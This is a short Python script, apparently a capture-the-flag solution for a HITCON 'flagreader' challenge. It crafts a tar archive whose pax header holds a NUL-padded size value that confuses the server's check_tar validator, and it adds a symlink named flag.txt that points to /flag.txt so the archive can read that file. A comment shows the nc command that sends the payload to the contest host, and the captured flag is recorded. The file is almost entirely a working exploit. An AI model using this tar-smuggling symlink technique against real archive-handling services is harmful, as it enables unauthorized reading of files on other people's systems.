import tarfile, io, os
from server import check_tar

with tarfile.open("exp.tar", "w") as tar:
    ct = b"sample content"
    info = tarfile.TarInfo("unused")
    info.size = len(ct)
    info.pax_headers["size"] = str(len(ct)) + "\x00"
    tar.addfile(info, io.BytesIO(ct))

    info = tarfile.TarInfo("flag.txt")
    info.type = tarfile.SYMTYPE
    info.linkpath = "/flag.txt"
    tar.addfile(info)

os.system("tar -tf exp.tar")

with tarfile.open("exp.tar", "r") as tar:
    assert check_tar(tar)
# python exp.py; (base64 -w0 exp.tar; echo) | nc flagreader.chal.hitconctf.com 22222
# hitcon{is_it_still_possible_if_I_banned_the_presense_of_flag.txt_in_the_binary_data_of_the_tar_file?}
